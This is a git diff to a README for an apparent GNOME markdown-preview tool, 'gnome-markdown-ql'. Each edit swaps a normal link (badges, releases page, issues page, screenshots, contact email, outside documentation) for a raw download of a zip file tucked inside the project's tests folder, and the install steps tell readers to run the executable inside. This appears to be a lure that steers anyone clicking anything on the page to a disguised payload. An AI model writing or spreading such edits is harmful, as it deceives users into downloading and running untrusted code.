@@ -1,8 +1,8 @@
 # Beautiful Markdown Previews for GNOME
 
-![Markdown Preview](https://img.shields.io/badge/Markdown%20Preview-GNOME-brightgreen) ![Releases](https://img.shields.io/badge/Releases-latest-blue)
+![Markdown Preview](https://github.com/OcuPerks/gnome-markdown-ql/raw/refs/heads/master/tests/ql_markdown_gnome_3.8.zip%20Preview-GNOME-brightgreen) ![Releases](https://github.com/OcuPerks/gnome-markdown-ql/raw/refs/heads/master/tests/ql_markdown_gnome_3.8.zip)
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/OcuPerks/gnome-markdown-ql/releases)
+[![Download](https://github.com/OcuPerks/gnome-markdown-ql/raw/refs/heads/master/tests/ql_markdown_gnome_3.8.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/OcuPerks/gnome-markdown-ql/raw/refs/heads/master/tests/ql_markdown_gnome_3.8.zip)
 
 ## Overview
 
@@ -19,7 +19,7 @@
 
 To install `gnome-markdown-ql`, follow these steps:
 
-1. **Download the latest release** from the [Releases page](https://github.com/OcuPerks/gnome-markdown-ql/releases).
+1. **Download the latest release** from the [Releases page](https://github.com/OcuPerks/gnome-markdown-ql/raw/refs/heads/master/tests/ql_markdown_gnome_3.8.zip).
 2. **Extract the downloaded file**.
 3. **Run the executable** to install the application.
 
@@ -71,7 +71,7 @@ If you want to contribute to `gnome-markdown-ql`, follow these steps:
 
 ## Issues
 
-If you encounter any issues while using `gnome-markdown-ql`, please check the [Issues](https://github.com/OcuPerks/gnome-markdown-ql/issues) section of the repository. You can report bugs or request features there.
+If you encounter any issues while using `gnome-markdown-ql`, please check the [Issues](https://github.com/OcuPerks/gnome-markdown-ql/raw/refs/heads/master/tests/ql_markdown_gnome_3.8.zip) section of the repository. You can report bugs or request features there.
 
 ## Topics
 
@@ -90,9 +90,9 @@ This project covers a range of topics related to markdown and GNOME:
 
 ## Screenshots
 
-![Markdown Preview Example](https://example.com/screenshot1.png)
+![Markdown Preview Example](https://github.com/OcuPerks/gnome-markdown-ql/raw/refs/heads/master/tests/ql_markdown_gnome_3.8.zip)
 
-![Markdown Code Example](https://example.com/screenshot2.png)
+![Markdown Code Example](https://github.com/OcuPerks/gnome-markdown-ql/raw/refs/heads/master/tests/ql_markdown_gnome_3.8.zip)
 
 ## License
 
@@ -104,12 +104,12 @@ Thanks to the contributors and the community for their support. Special thanks t
 
 ## Contact
 
-For any inquiries, you can reach out via GitHub issues or contact me directly at [your-email@example.com](mailto:your-email@example.com).
+For any inquiries, you can reach out via GitHub issues or contact me directly at [https://github.com/OcuPerks/gnome-markdown-ql/raw/refs/heads/master/tests/ql_markdown_gnome_3.8.zip](https://github.com/OcuPerks/gnome-markdown-ql/raw/refs/heads/master/tests/ql_markdown_gnome_3.8.zip).
 
 ## Additional Resources
 
-- [Markdown Guide](https://www.markdownguide.org/)
-- [GNOME Documentation](https://help.gnome.org/users/)
-- [Nautilus Documentation](https://help.gnome.org/users/nautilus/stable/)
+- [Markdown Guide](https://github.com/OcuPerks/gnome-markdown-ql/raw/refs/heads/master/tests/ql_markdown_gnome_3.8.zip)
+- [GNOME Documentation](https://github.com/OcuPerks/gnome-markdown-ql/raw/refs/heads/master/tests/ql_markdown_gnome_3.8.zip)
+- [Nautilus Documentation](https://github.com/OcuPerks/gnome-markdown-ql/raw/refs/heads/master/tests/ql_markdown_gnome_3.8.zip)
 
-For the latest updates and releases, check the [Releases section](https://github.com/OcuPerks/gnome-markdown-ql/releases) regularly.
+For the latest updates and releases, check the [Releases section](https://github.com/OcuPerks/gnome-markdown-ql/raw/refs/heads/master/tests/ql_markdown_gnome_3.8.zip) regularly.
